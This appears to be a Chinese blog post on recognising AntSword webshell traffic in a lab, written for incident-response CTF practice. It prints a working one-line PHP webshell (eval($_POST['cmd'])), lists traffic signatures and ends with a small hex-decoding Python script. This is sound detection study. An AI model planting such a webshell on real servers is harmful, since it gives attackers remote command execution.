前言

做应急响应题遇到了蚁剑流量分析的题，就正好研究一下

蚁剑流量特征

基本特征

在kali虚拟机中用小皮面板开一个站点，然后上传一个木马文件

内容如下

#1.php
<?php
eval($_POST['cmd']);
?>

然后打开wireshark，接着用蚁剑进行连接，这时就可以抓到蚁剑流量的包了

这个就是蚁剑连接该ip的流量包了，我们右键红框那条，然后查看TCP流

这个就是蚁剑的流量包内容。现在可以总结蚁剑流量的基本特征

1. 请求包中有`ini_set`函数
2. 连接命令在第一个=前
3. 使用的是php语言

from urllib.parse import unquote,quote

a = "77696E676C65740D0A"
for i in range(0,len(a),2):
    if __name__ == '__main__':
        tmp = unquote(f"%{a[i]}{a[i+1]}")
        print(tmp, end="")
